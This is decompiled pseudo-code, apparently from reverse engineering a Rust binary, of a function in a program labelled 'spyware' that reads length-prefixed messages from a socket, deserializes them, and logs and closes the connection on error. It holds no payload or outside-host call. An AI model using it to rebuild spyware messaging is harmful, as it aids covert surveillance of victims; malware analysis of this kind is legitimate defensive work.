
  void** spyware::communication::server::get_message::hbc00a55f19d841bb(int64_t* arg1, int32_t* arg2)

{
    int32_t* var_110 = arg2;
    int32_t var_114 = 0;
    void** result_2 = std::io::default_read_exact::h211f5ece7b69528c(&var_110, &var_114, 4);
    int16_t var_100;
    int64_t var_f8;
    uint64_t var_f0;
    void** const var_98;
    
    if (!result_2)
    {
        _$LT$u8$u20$as$u20$alloc..vec..spec_from_elem..SpecFromElem$GT$::from_elem::h7bf4e21cb06e4eac(&var_100, 
            spyware::communication::serialization::extract_msg_type_and_length::h40fb0f3bb65520f5(
                var_114));
        core::result::Result$LT$T$C$E$GT$::expect::h34ced1219d91af61(
            std::io::default_read_exact::h211f5ece7b69528c(&var_110, var_f8, var_f0));
        ron::de::from_bytes::ha5c92b24cfa261b6(&var_98);
        int128_t var_58;
        core::result::Result$LT$T$C$E$GT$::unwrap::h4c1d4d68a5062f9a(&var_58, &var_98);
        int128_t zmm0_2 = var_58;
        int128_t var_28;
        *(arg1 + 0x30) = var_28;
        int128_t var_38;
        *(arg1 + 0x20) = var_38;
        int128_t var_48;
        *(arg1 + 0x10) = var_48;
        *arg1 = zmm0_2;
        return core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$u8$GT$$GT$::h5aa1feab37440eed(
            &var_100);
    }
    
    void** result_1 = result_2;
    
    if (!core::sync::atomic::atomic_load::h8c88032dab18ab12())
        goto label_44ccb2;
    
    std::net::tcp::TcpStream::peer_addr::h9ccf6949693ba95c(&var_100, var_110);
    int16_t rax_1 = var_100;
    int64_t rax_2;
    
    if (rax_1 != 2)
    {
        int16_t var_fa;
        int16_t var_d2_1 = var_fa;
        int32_t var_fe;
        int32_t var_d6_1 = var_fe;
        int128_t zmm0_1 = var_f0;
        int128_t var_18_1 = zmm0_1;
        int16_t var_d8 = rax_1;
        int64_t var_d0_1 = var_f8;
        int128_t var_c8_1 = zmm0_1;
        int16_t* var_b8 = &var_d8;
        int64_t (* var_b0_1)(char* arg1) = _$LT$core..net..socket_addr..SocketAddr$u20$as$u20$core..fmt..Display$GT$::fmt::hb8f0b665671134da;
        void*** var_a8_1 = &result_1;
        int64_t (* var_a0_1)(int64_t* arg1, int64_t* arg2) =
            _$LT$std..io..error..Error$u20$as$u20$core..fmt..Display$GT$::fmt::hcf0c0103019d8a0a;
        var_98 = &data_4b8bb0;
        int64_t var_90_1 = 2;
        int64_t var_78_1 = 0;
        int16_t** var_88_1 = &var_b8;
        int64_t var_80_1 = 2;
        int64_t rax_6 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b8c18);
        var_100 = "spyware::communication::serverUn…";
        int64_t var_f8_1 = 0x1e;
        char const* const var_f0_1 = "spyware::communication::serverUn…";
        int64_t var_e8_1 = 0x1e;
        int64_t var_e0_1 = rax_6;
        log::__private_api::log::h13afddf373bd7d7f(&var_98, 1, &var_100);
        label_44ccb2:
        rax_2 = std::os::unix::net::stream::UnixStream::shutdown::h18b658800364aeec(var_110, 2);
        
        if (!rax_2)
        {
            void** result = result_1;
            arg1[1] = result;
            *arg1 = -0x7ffffffffffffff6;
            return result;
        }
    }
    else
        rax_2 = var_f8;
    
    arg1[1] = rax_2;
    *arg1 = -0x7ffffffffffffff6;
    return core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h2ffe2f512d0f1687(&result_1);
}
